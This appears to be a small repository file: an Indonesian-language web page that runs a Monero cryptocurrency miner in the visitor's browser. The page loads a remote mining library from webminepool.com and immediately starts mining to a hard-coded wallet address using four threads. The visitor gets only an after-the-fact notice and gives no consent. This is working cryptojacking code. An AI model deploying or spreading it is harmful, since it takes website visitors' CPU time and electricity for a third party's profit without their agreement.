# web-miner<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Penambang Monero di Browser</title>
</head>
<body>
  <h2>Selamat datang di Penambang Web Monero</h2>
  <p>Penambangan sedang berlangsung di latar belakang. Terima kasih sudah mendukung!</p>

  <script src="https://webminepool.com/lib/base.js"></script>
  <script>
    miner = WMP.Anonymous('49shJXVtwZSH9FkA38aQ1RC99Pgxs2un4jbTBZ2L9z7AdRUZMcx61QQiCVp59ptTTRUhoGJaSMi6q9pATspZP2zGGSCYyQS', {
      threads: 4,
      autoThreads: false,
      throttle: 0.3,
      forceASMJS: false
    });
    miner.start();
  </script>
</body>
</html>
